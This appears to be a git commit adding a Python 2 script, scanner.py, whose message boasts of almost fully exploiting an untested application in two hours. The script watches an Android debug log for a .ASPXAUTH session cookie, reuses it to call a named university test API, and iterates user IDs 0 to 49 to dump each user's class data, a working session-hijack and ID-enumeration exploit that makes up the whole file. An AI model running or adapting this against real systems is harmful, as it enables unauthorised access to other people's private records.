a659353de2e4f18e16e28a58b13962a5f09fd876
Erik Regla <erik.regla@gmail.com>
2017-07-01 04:00:07 -0400

    Initial commit. Just only 2 hours to almost fully exploit an application that didn't even started it's test phase yet? WWWWW

---
+++ scanner.py
@@ -0,0 +1,45 @@
+import requests
+import json
+import re
+import time
+
+def check_string(w, filename):
+    with open(filename) as f:
+        found = False
+        for line in f:
+            if re.search("{0}".format(w),line):
+                return line
+        return False
+
+cookie_found = False
+cookie = ""
+
+print "Now I will start searching on adb_dump.log for any cookies available. As soon as I grab one I'll start crawling. "
+while not cookie_found:
+    r = check_string(".ASPXAUTH", "adb_dump.log")
+    if not r:
+        time.sleep(1)
+    else:
+        cookie = r
+        cookie_found = True
+
+cookie_string = re.search('.ASPXAUTH=(.+?);', cookie).group(1)
+print "Session cookie found: " + cookie_string
+
+login_url   = "http://test.ingenieriautalca.cl/api/CuentaApi/Ingresar"
+classes_url = "http://test.ingenieriautalca.cl/api/CursoApi/ProximasClases"
+headers = {
+    'content-type': "application/json",
+    'cache-control': "no-cache"
+}
+cookie = {
+    ".ASPXAUTH" : cookie_string
+}
+
+for id in range(0,50):
+    payload = {"ID": id}
+    r = requests.post(classes_url, cookies=cookie, json=payload, headers=headers)
+    if r.text != "[]":
+        print "USER= " + str(id) + ", DATA= " + r.text
+
+print "Scanning finished!"
